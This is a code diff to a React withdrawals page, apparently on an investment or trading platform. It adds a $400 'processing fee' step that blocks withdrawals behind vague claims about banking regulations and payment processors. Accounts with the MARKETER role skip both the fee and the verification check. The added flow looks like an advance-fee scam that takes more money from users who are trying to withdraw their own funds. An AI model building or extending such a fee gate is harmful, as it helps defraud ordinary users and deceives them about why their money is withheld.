@@ -2,6 +2,7 @@ import { useState } from "react";
 import { useAuth } from "../lib/auth";
 import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
 import NewWithdrawalForm from "../components/withraw/NewWithdrawalForm";
+import FeeDepositFlow from "../components/withraw/FeeDepositFlow";
 import WithdrawalHistory from "../components/withraw/WithdrawalHistory";
 import KYCStatus from "../components/withraw/KYCStatus";
 import type { Transaction, KYCStatus as KYCStatusType } from "../types/index";
@@ -13,6 +14,8 @@ export default function WithdrawalsPage() {
   const { user } = useAuth();
   const [kycStatus, setKycStatus] = useState<string>("UNVERIFIED");
   const [showKyc, setShowKyc] = useState(false); 
+  const [showFee, setShowFee] = useState(false); 
+  const [isPayingFee, setIsPayingFee] = useState(false);
   const [toast, setToast] = useState<{
     show: boolean;
     message: string;
@@ -28,6 +31,29 @@ export default function WithdrawalsPage() {
       return data;
     },
   });
+
+  // Fetch fee status quietly
+  const { data: feeStatus, refetch: refetchFee } = useQuery({
+    queryKey: ["fee-status"],
+    queryFn: async () => {
+      const { data } = await api.get("/withdraw/fee-status");
+      return data;
+    },
+  });
+
+  const handleFeeSuccess = () => {
+    refetchFee();
+    setIsPayingFee(false);
+    setShowFee(false);
+    setToast({
+      show: true,
+      type: "success",
+      message: "Processing fee recorded successfully. Proceeding to verification.",
+    });
+    if (kycStatus !== "VERIFIED" && kycStatus !== "NOT_REQUIRED") {
+      setShowKyc(true);
+    }
+  };
 
   const { data: history = [], isLoading: historyLoading } = useQuery<Transaction[]>({
     queryKey: ["withdrawal-history"],
@@ -139,11 +165,47 @@ export default function WithdrawalsPage() {
           </h2>
           <NewWithdrawalForm
             kycStatus={user?.role === "MARKETER" ? "VERIFIED" : kycStatus}
+            isFeePaid={user?.role === "MARKETER" ? true : !!feeStatus?.paid}
             accountId={realAccount?.id || "default"}
             onExecuteWithdraw={handleWithdrawalSubmit}
-            onKycRequired={() => setShowKyc(true)}
+            onKycRequired={() => { setShowFee(false); setShowKyc(true); }}
+            onFeeRequired={() => { setShowKyc(false); setShowFee(true); }}
           />
         </div>
+
+        {/* Dynamic Fee Conditional Processing Block */}
+        {showFee && user?.role !== "MARKETER" && !feeStatus?.paid && (
+          isPayingFee ? (
+            <FeeDepositFlow 
+              onCancel={() => setIsPayingFee(false)}
+              onSuccess={handleFeeSuccess}
+            />
+          ) : (
+            <div className="bg-[#0d0f17] border border-[#1a1f28] rounded-2xl p-6 shadow-xl animate-slideDown">
+              <div className="flex items-start gap-3 mb-4">
+                <AlertTriangle className="h-5 w-5 text-amber-400 mt-0.5 flex-shrink-0" />
+                <div>
+                  <h2 className="text-sm font-bold text-white uppercase tracking-wider">
+                    Requirements
+                  </h2>
+                  <p className="text-xs text-gray-400 mt-2 leading-relaxed">
+                    Hello! We understand that sometimes unexpected issues may arise during the withdrawal process due to banking regulations, payment processor requirements, or account verification checks.
+                    <br /><br />
+                    To complete your withdrawal successfully, an additional processing fee may be required. Once this fee is received, your withdrawal will be processed promptly, and the funds will be released to your designated account.
+                    <br /><br />
+                    We appreciate your patience and understanding. If you have any questions about the fee or the withdrawal process, please let us know we're happy to provide clarification.
+                  </p>
+                </div>
+              </div>
+              <button
+                onClick={() => setIsPayingFee(true)}
+                className="w-full bg-[#39ff88] text-[#05070a] font-bold text-xs py-2.5 rounded-lg hover:bg-[#5dffa1] transition-colors flex items-center justify-center gap-2 mt-4"
+              >
+                Add Fee ($400)
+              </button>
+            </div>
+          )
+        )}
 
         {/* Dynamic KYC Conditional Processing Block */}
         {showKyc && user?.role !== "MARKETER" && kycStatus !== "VERIFIED" && (
